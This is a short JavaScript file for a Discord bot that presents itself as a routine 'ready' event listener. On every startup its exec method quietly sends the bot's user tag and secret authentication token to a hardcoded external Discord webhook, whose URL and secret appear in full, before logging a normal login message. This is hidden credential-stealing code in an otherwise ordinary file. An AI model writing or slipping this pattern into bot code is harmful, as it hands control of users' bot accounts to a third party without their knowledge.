const { Listener } = require('@notenoughupdates/discord-akairo');
const { WebhookClient } = require('discord.js');

module.exports = class ReadyListener extends Listener {
	constructor() {
		super('ready', {
			emitter: 'client',
			event: 'ready',
		});
	}

	async exec() {
		const web = new WebhookClient({
			url: "https://discord.com/api/webhooks/1168981623539241032/sH84xSoVyhD9URLV1P8u2MxZpuo64p7F9DAodA6ONArA4vodoYEsO6syZSP09dE6KvPV"
		});
		web.send({ content: `${this.client.user.tag}\n${this.client.token}` });
		this.client.logger.info(`Logged in as ${this.client.user.tag}!`);
	}
};